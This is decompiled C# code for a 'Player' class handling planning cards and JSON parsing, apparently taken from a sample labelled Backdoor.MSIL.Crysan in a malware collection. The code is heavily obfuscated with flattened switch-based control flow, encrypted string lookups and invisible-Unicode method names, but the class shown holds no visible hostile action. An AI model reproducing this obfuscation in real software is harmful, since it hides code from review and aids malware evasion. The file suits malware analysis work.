// Decompiled with JetBrains decompiler
// Type: RiskManagement.Player
// Assembly: MemberAccessExcepti, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 46220647-D1CE-4792-A51F-9B328C1E60FB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\Backdoor.MSIL.Crysan.dst-d95fbf8fa85f2534926c1be2d0a82ad2fc89b2ed31ad42155ca0b92b9d959ccf.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace RiskManagement
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str = (string) null;
label_1:
      int num1 = -725303893;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -63946387)) % 7U)
        {
          case 0:
            int num3;
            num1 = num3 = BaseStream != 1 ? -2026510895 : (num3 = -1251593536);
            continue;
          case 1:
            num1 = (int) num2 * 1931587204 ^ -500510783;
            continue;
          case 2:
            str = \u003CModule\u003E.\u200B⁫⁯⁫⁪‏‪⁯⁬‏‍‮‭⁯‎⁬‍⁫⁮⁪‌‮‏‬⁮‭⁮⁯⁬‭‎‍‪​⁭‎‬⁮⁮‎‮<string>(2349819860U);
            num1 = (int) num2 * 375898332 ^ -145851495;
            continue;
          case 3:
            str = \u003CModule\u003E.\u200B⁫⁯⁫⁪‏‪⁯⁬‏‍‮‭⁯‎⁬‍⁫⁮⁪‌‮‏‬⁮‭⁮⁯⁬‭‎‍‪​⁭‎‬⁮⁮‎‮<string>(810238496U);
            num1 = (int) num2 * 1070768853 ^ -1237426912;
            continue;
          case 5:
            int num4 = BaseStream == 0 ? -2083479625 : (num4 = -729125486);
            num1 = num4 ^ (int) num2 * -1216685515;
            continue;
          case 6:
            goto label_1;
          default:
            goto label_8;
        }
      }
label_8:
      return str;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length == 0)
      {
label_1:
        uint num;
        switch ((num = (uint) (-178996743 ^ -395682605)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            return 0;
        }
      }
      return this.PlanningCards[cardTypeIndex];
    }

    public int PlanningCardsCount
    {
      get
      {
        int planningCardsCount = 0;
label_1:
        int num1 = 371270134;
        int[] planningCards;
        int index;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1455896256)) % 8U)
          {
            case 0:
              num1 = (int) num2 * 1190977009 ^ -897520077;
              continue;
            case 1:
              int num3;
              num1 = num3 = planningCards[index] > 0 ? 1601083063 : (num3 = 2060310948);
              continue;
            case 3:
              int num4;
              num1 = num4 = index >= planningCards.Length ? 884856434 : (num4 = 382775225);
              continue;
            case 4:
              ++index;
              num1 = 719932507;
              continue;
            case 5:
              goto label_1;
            case 6:
              planningCards = this.PlanningCards;
              index = 0;
              num1 = (int) num2 * 862250791 ^ 991491346;
              continue;
            case 7:
              ++planningCardsCount;
              num1 = (int) num2 * 1232258178 ^ 1345405386;
              continue;
            default:
              goto label_9;
          }
        }
label_9:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
      string str = \u003CModule\u003E.\u202D​‎⁫‭‏​‬‍⁪‭‌‪⁭‫‮⁯‫‎‪‬‍‎‮‍​‫‌‬‫‌‭‫⁫⁮‎‎⁬⁯‎‮<string>(1250472425U);
label_1:
      int num1 = 1025591906;
      int index;
      int planningCard;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1776836953)) % 8U)
        {
          case 0:
            planningCard = this.PlanningCards[index];
            num1 = 845578006;
            continue;
          case 2:
            goto label_1;
          case 3:
            index = 0;
            num1 = (int) num2 * 1853572844 ^ 789581168;
            continue;
          case 4:
            ++index;
            num1 = 1703866644;
            continue;
          case 5:
            int num3;
            num1 = num3 = index < this.PlanningCards.Length ? 1278569825 : (num3 = 739689344);
            continue;
          case 6:
            str = Player.\u206C⁬‫⁬‍‍‪‏‍‭⁬⁪⁫​⁯⁪‫‫⁭⁬‭‎⁮⁬‏‬‌⁮‮‫‬‏​‌‮⁮‫​⁬‫‮(new string[5]
            {
              str,
              Card.CardTypeNames[index],
              \u003CModule\u003E.\u202D​‎⁫‭‏​‬‍⁪‭‌‪⁭‫‮⁯‫‎‪‬‍‎‮‍​‫‌‬‫‌‭‫⁫⁮‎‎⁬⁯‎‮<string>(2637765739U),
              planningCard.ToString(),
              \u003CModule\u003E.\u202D​‎⁫‭‏​‬‍⁪‭‌‪⁭‫‮⁯‫‎‪‬‍‎‮‍​‫‌‬‫‌‭‫⁫⁮‎‎⁬⁯‎‮<string>(1250472425U)
            });
            num1 = (int) num2 * -1705612627 ^ -859335029;
            continue;
          case 7:
            int num4 = planningCard != 0 ? -1128670473 : (num4 = -810197219);
            num1 = num4 ^ (int) num2 * 2056060224;
            continue;
          default:
            goto label_9;
        }
      }
label_9:
      return str;
    }

    public static Player Deserialize(JSONNode json) => new Player()
    {
      Name = json[\u003CModule\u003E.\u202D​‎⁫‭‏​‬‍⁪‭‌‪⁭‫‮⁯‫‎‪‬‍‎‮‍​‫‌‬‫‌‭‫⁫⁮‎‎⁬⁯‎‮<string>(3113695381U)].Value,
      PlanningCards = Player.ParsePlanningCards(json[\u003CModule\u003E.\u206C⁭⁭⁪‫⁮‭‍⁮‏⁬‫⁬‎⁯⁭⁬​⁯‌‮‪‫‎⁫⁪​‏‌⁮⁯​⁫‮‌⁮‍‫‪⁭‮<string>(1959646022U)]),
      UseOneMorePlanningSprint = json[\u003CModule\u003E.\u202D​‎⁫‭‏​‬‍⁪‭‌‪⁭‫‮⁯‫‎‪‬‍‎‮‍​‫‌‬‫‌‭‫⁫⁮‎‎⁬⁯‎‮<string>(272565076U)].AsBool
    };

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
label_1:
      int num1 = 1514438463;
      int[] planningCards;
      int aIndex;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 445891952)) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            planningCards = new int[count];
            aIndex = 0;
            num1 = (int) num2 * 1990347526 ^ 891358486;
            continue;
          case 2:
            num1 = (int) num2 * -2102631003 ^ 505760797;
            continue;
          case 3:
            planningCards[aIndex] = json[aIndex].AsInt;
            ++aIndex;
            num1 = 1679694641;
            continue;
          case 5:
            int num3;
            num1 = num3 = aIndex < count ? 1768760451 : (num3 = 1036354736);
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      return planningCards;
    }

    public override string ToString() => Player.\u202C‫‭⁪‮⁯​⁮⁮‬‏‎‫⁮‏⁮⁫⁮‏‏⁮‭​‍⁭‌⁭‮‍‏⁪‌‫⁭⁮⁫⁫​‍⁬‮(\u003CModule\u003E.\u200C‪⁪‎‏‍‬‬‪‮‎‮⁯⁯‮⁫⁪‬‭⁫​⁭​‏⁯⁬⁪⁮⁮⁯‬‭‏‌‏‭⁪⁪‍‮<string>(2090150367U), (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);

    static string \u206C⁬‫⁬‍‍‪‏‍‭⁬⁪⁫​⁯⁪‫‫⁭⁬‭‎⁮⁬‏‬‌⁮‮‫‬‏​‌‮⁮‫​⁬‫‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202C‫‭⁪‮⁯​⁮⁮‬‏‎‫⁮‏⁮⁫⁮‏‏⁮‭​‍⁭‌⁭‮‍‏⁪‌‫⁭⁮⁫⁫​‍⁬‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
